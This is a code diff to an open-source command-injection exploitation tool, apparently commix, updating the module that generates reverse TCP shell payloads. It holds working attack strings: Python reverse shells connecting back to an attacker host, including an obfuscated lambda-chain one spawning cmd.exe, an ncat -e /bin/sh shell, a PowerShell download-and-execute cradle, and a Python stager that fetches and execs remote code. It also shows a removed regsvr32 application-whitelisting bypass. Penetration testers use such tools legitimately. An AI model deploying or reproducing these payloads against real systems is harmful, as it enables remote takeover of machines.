@@ -121,8 +121,8 @@ Set up the Python working directory on the target host.
 def set_python_working_dir():
   while True:
     if not menu.options.batch:
-      question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
-      question_msg += "' as Python working directory on the target host? [Y/n] > "
+      question_msg = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER 
+      question_msg += "' as Python interpreter on the target host? [Y/n] > "
       python_dir = _input(settings.print_question_msg(question_msg))
     else:
       python_dir = ""
@@ -131,13 +131,39 @@ def set_python_working_dir():
     if python_dir in settings.CHOICE_YES:
       break
     elif python_dir in settings.CHOICE_NO:
-      question_msg = "Please provide a custom working directory for Python (e.g. '" 
-      question_msg += settings.WIN_PYTHON_DIR + "') > "
-      settings.WIN_PYTHON_DIR = _input(settings.print_question_msg(question_msg))
+      question_msg = "Please provide a full path directory for Python interpreter (e.g. '" 
+      question_msg += "C:\\Python27\\python.exe') > "
+      settings.WIN_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
       settings.USER_DEFINED_PYTHON_DIR = True
       break
     else:
       err_msg = "'" + python_dir + "' is not a valid answer."  
+      print(settings.print_error_msg(err_msg))
+      pass
+
+"""
+Set up the Python interpreter on linux target host.
+"""
+def set_python_interpreter():
+  while True:
+    if not menu.options.batch:
+      question_msg = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
+      question_msg += "' as Python interpreter on the target host? [Y/n] > "
+      python_interpreter = _input(settings.print_question_msg(question_msg))
+    else:
+      python_interpreter = ""
+    if len(python_interpreter) == 0:
+       python_interpreter = "Y"
+    if python_interpreter in settings.CHOICE_YES:
+      break
+    elif python_interpreter in settings.CHOICE_NO:
+      question_msg = "Please provide a custom working interpreter for Python (e.g. '" 
+      question_msg += "python27') > "
+      settings.LINUX_PYTHON_INTERPRETER = _input(settings.print_question_msg(question_msg))
+      settings.USER_DEFINED_PYTHON_INTERPRETER = True
+      break
+    else:
+      err_msg = "'" + python_interpreter + "' is not a valid answer."  
       print(settings.print_error_msg(err_msg))
       pass
 
@@ -203,7 +229,7 @@ def netcat_version(separator):
 
   while True:
     nc_version = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like targets""" + Style.RESET_ALL + """ ]--- 
+---[ """ + Style.BRIGHT + Fore.BLUE + """Netcat reverse TCP shells""" + Style.RESET_ALL + """ ]--- 
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 
@@ -276,7 +302,7 @@ def other_reverse_shells(separator):
 
   while True:
     other_shell = _input("""
----[ """ + Style.BRIGHT + Fore.BLUE + """Unix-like reverse TCP shells""" + Style.RESET_ALL + """ ]---
+---[ """ + Style.BRIGHT + Fore.BLUE + """Generic reverse TCP shells""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a PHP reverse TCP shell.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use a Perl reverse TCP shell.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use a Ruby reverse TCP shell. 
@@ -284,11 +310,11 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reve
 Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat reverse TCP shell.
 Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Bash reverse TCP shell.
 Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Ncat reverse TCP shell.
-\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Windows reverse TCP shells""" + Style.RESET_ALL + """ ]---
-Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
+Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python reverse TCP shell (windows).
+\n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
+Type '""" + Style.BRIGHT + """9""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
 Type '""" + Style.BRIGHT + """10""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
-Type '""" + Style.BRIGHT + """11""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
+Type '""" + Style.BRIGHT + """11""" + Style.RESET_ALL + """' to use a meterpreter reverse TCP shell (windows). 
 Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web delivery script. 
 \ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     
@@ -323,7 +349,9 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 
     # Python-reverse-shell 
     elif other_shell == '4':
-      other_shell = "python -c 'import socket,subprocess,os%0d" \
+      if not settings.USER_DEFINED_PYTHON_INTERPRETER:
+        set_python_interpreter()
+      other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c 'import socket,subprocess,os%0d" \
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0d" \
                     "s.connect((\"" + settings.LHOST  + "\"," + settings.LPORT + "))%0d" \
                     "os.dup2(s.fileno(),0)%0d" \
@@ -350,8 +378,41 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
       other_shell = "ncat " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"
       break
 
-    # PHP-reverse-shell (meterpreter)
+    # Windows Python-reverse-shell
     elif other_shell == '8':
+      data =  "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + settings.LHOST + "', " + settings.LPORT + ")), " \
+              "[[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), " \
+              "  __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), " \
+              "    {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: " \
+              "    __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: " \
+              "      after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, " \
+              "      __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] " \
+              "for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] " \
+              "for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] " \
+              "for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], " \
+              "  stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] " \
+              "in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in " \
+              "[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] " \
+              "if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] " \
+              "for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: " \
+              "[(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) " \
+              "for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) " \
+              "for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] " \
+              "for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] " \
+              "for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), " \
+              "globals(), __import__('contextlib'))"
+
+      if not settings.TARGET_OS == "win":
+        windows_only_attack_vector()
+        continue
+      else:
+        if not settings.USER_DEFINED_PYTHON_DIR: 
+          set_python_working_dir()
+        other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
+      break
+
+    # PHP-reverse-shell (meterpreter)
+    elif other_shell == '9':
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
         print(settings.print_error_msg(error_msg))
@@ -393,37 +454,6 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         print(settings.SINGLE_WHITESPACE)
       break
 
-    # Python-reverse-shell
-    elif other_shell == '9':
-      data =  " -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('" + settings.LHOST + "', " + settings.LPORT + ")), " \
-              "[[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), " \
-              "  __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), " \
-              "    {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: " \
-              "    __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: " \
-              "      after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, " \
-              "      __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] " \
-              "for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] " \
-              "for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] " \
-              "for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], " \
-              "  stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] " \
-              "in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in " \
-              "[(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] " \
-              "if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] " \
-              "for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: " \
-              "[(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) " \
-              "for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) " \
-              "for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] " \
-              "for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] " \
-              "for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), " \
-              "globals(), __import__('contextlib'))\""
-
-      if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-        set_python_working_dir()
-        other_shell = settings.WIN_PYTHON_DIR + data
-      else:
-        other_shell = "python" + data
-      break
-
     # Python-reverse-shell (meterpreter)
     elif other_shell == '10':
       if not os.path.exists(settings.METASPLOIT_PATH):
@@ -446,8 +476,8 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         with open (output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          data = base64.b64encode(data)
-
+          #data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
+          
         print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
@@ -458,11 +488,14 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
                           "set lport " + str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-          set_python_working_dir()
-          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+        if settings.TARGET_OS == "win":
+          if not settings.USER_DEFINED_PYTHON_DIR: 
+            set_python_working_dir()
+          other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\"" 
         else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          if not settings.USER_DEFINED_PYTHON_INTERPRETER:
+            set_python_interpreter()
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
         msf_launch_msg(output)
       except:
         print(settings.SINGLE_WHITESPACE)
@@ -479,7 +512,6 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use shellcode injection with native x86 shellcode.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
-Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe application whitelisting bypass.
 \ncommix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
 
           if any(option in windows_reverse_shell.lower() for option in settings.SHELL_OPTIONS): 
@@ -489,8 +521,6 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
             output = "powershell_attack.rc"
           elif windows_reverse_shell == '2' :
             output = "powershell_attack.txt"
-          elif windows_reverse_shell == '3' :
-            output = "regsvr32_applocker_bypass_server.rc"
           else:
             err_msg = "The '" + windows_reverse_shell + "' option, is not valid."  
             print(settings.print_error_msg(err_msg))
@@ -570,24 +600,6 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
             except:
               print(settings.SINGLE_WHITESPACE)
             break
-
-          # Regsvr32.exe application whitelisting bypass
-          elif windows_reverse_shell == '3':
-            with open(output, 'w+') as filewrite:
-              filewrite.write("use exploit/windows/misc/regsvr32_applocker_bypass_server\n"
-                              "set payload " + payload + "\n"
-                              "set lhost " + str(settings.LHOST) + "\n"
-                              "set lport " + str(settings.LPORT) + "\n"
-                              "set srvport " + str(settings.SRVPORT) + "\n"
-                              "set uripath " + settings.URIPATH + "\n"
-                              "exploit\n\n")
-            if not settings.TARGET_OS == "win":
-              windows_only_attack_vector()
-              continue
-            else:
-              other_shell = "regsvr32 /s /n /u /i:http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH +".sct scrobj.dll"
-              msf_launch_msg(output)
-              break
       break
     
     # Web delivery script
@@ -597,7 +609,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Web delivery script""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
-Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meterpreter reverse TCP shell.
+Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use meterpreter reverse TCP shell (windows).
 \ncommix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
 
         if any(option in  web_delivery.lower() for option in settings.SHELL_OPTIONS):  
@@ -632,13 +644,15 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
                             "exploit\n\n")
 
           if web_delivery == '1':
-            data = "; r=_urllib.request.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
-            data = base64.b64encode(data)
-            if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-              set_python_working_dir()
-              other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+            data = "import sys%3bimport ssl%3bu%3d__import__('urllib'%2b{2%3a'',3%3a'.request'}[sys.version_info[0]],fromlist%3d('urlopen',))%3br%3du.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "',context%3dssl._create_unverified_context())%3bexec(r.read())%3b"
+            if settings.TARGET_OS == "win":
+              if not settings.USER_DEFINED_PYTHON_DIR: 
+                set_python_working_dir()
+              other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
             else:
-              other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+              if not settings.USER_DEFINED_PYTHON_INTERPRETER:
+                set_python_interpreter()
+              other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
             msf_launch_msg(output)
             break
           elif web_delivery == '2':
@@ -655,8 +669,8 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
               continue
             else:
               other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "');"
-              msf_launch_msg(output)
-              break
+            msf_launch_msg(output)
+            break
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
@@ -678,7 +692,7 @@ def reverse_tcp_options(separator):
   while True:
     reverse_tcp_option = _input("""   
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Reverse TCP shells""" + Style.RESET_ALL + """ ]---     
-Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat reverse TCP shell.
+Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' for netcat reverse TCP shells.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other reverse TCP shells.
 \ncommix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """) > """)
 
